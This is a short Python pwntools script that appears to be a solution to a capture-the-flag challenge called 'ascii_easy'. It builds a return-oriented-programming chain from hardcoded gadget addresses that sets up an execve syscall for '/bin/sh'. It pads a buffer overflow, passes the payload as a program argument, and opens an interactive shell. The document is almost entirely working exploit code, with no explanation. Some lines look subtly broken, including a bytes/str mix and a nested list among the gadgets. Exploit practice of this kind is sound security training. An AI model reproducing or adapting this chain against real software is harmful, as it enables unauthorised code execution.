from datetime import datetime

from pwn import *

INCREASE_EDX_GADGET = 0x55642d7a
INCREASE_EAX_GADGET = 0x556c6864
MOVE_EDX_TO_EBX_GADGET = 0x55606476
INT_80_GADGET = 0x55667176
STORE_MAX_INT_IN_EDX = 0x55617940
STORE_DEREFERNCED_EDX_IN_ECX = 0x555f616f

BINARY_PATH = '/home/ascii_easy/ascii_easy'


def build_payload():
    rop_builder = ROP(elfs=[ELF(BINARY_PATH)])

    increase_eax_to_sys_execve = [INCREASE_EAX_GADGET] * 11
    increase_edx_until_zero = [INCREASE_EDX_GADGET] * 20

    store_zero_in_edx = [
        STORE_MAX_INT_IN_EDX,
        INCREASE_EDX_GADGET
    ]

    gadgets = [MOVE_EDX_TO_EBX_GADGET] + increase_edx_until_zero + [STORE_DEREFERNCED_EDX_IN_ECX] + \
              ['A' * 12] + [store_zero_in_edx] + increase_eax_to_sys_execve + [INT_80_GADGET]

    for gadget in gadgets:
        rop_builder.raw(gadget)

    return b'A' * 32 + str(rop_builder) + '/bin/sh'


def main():
    context.log_level = 'error'

    payload = build_payload()
    print(build_payload().replace('`', '\\`'))
    p = process(argv=[BINARY_PATH, payload], env={'VARIABLE1': 'AAAAAAAAAAAAAAAAAAAAAAAAA'})
    p.interactive()


if __name__ == '__main__':
    main()
